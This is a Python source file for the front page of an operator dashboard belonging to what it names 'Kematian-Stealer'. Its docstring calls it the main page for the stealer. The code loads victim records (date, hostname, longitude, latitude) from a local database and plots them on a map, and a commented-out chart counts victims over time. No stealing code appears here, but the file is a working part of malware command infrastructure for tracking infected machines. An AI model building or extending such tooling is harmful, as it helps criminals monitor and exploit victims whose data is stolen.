import os
import aiosqlite

from nicegui import ui

# from panel.ui.handlers.stats_handler import StatisticsHandler

from panel.ui.html.html import html_handler


async def fr_page() -> None:
    """Main page for the stealer. Now includes a cool chart!"""

    # stat_handler = StatisticsHandler()

    #
    # data = await stat_handler.get_people()
    # dates = [item[0] for item in data]
    # values = [item[1] for item in data]
    #
    # chart = ui.echart(
    #    {
    #        "xAxis": {"type": "category", "data": dates},
    #        "yAxis": {"type": "value"},
    #        "series": [{"type": "line", "data": values, "smooth": True}],
    #    }
    # ).classes("w-full h-full")
    #
    # chart.run_chart_method(
    #    ":setOption",
    #    r'{tooltip: {formatter: params => "" + params.value}}',
    # )
    db_path_map = os.path.join(os.getenv("APPDATA"), "Kematian-Stealer", "map.db")
    map_data = []
    async with aiosqlite.connect(db_path_map) as db:
        locations = await db.execute_fetchall(
            """
            SELECT * FROM map
            """
        )
        # ROW STRUCTURE
        # ID
        # DATE
        # HOSTNAME
        # LONGITUDE
        # LATITUDE
        for location in locations:
            map_data.append(
                {
                    "date": location[1],
                    "hostname": location[2],
                    "longitude": location[3],
                    "latitude": location[4],
                }
            )

    html_handler_main = html_handler(map_data)

    ui.add_body_html(html_handler_main.get_html())
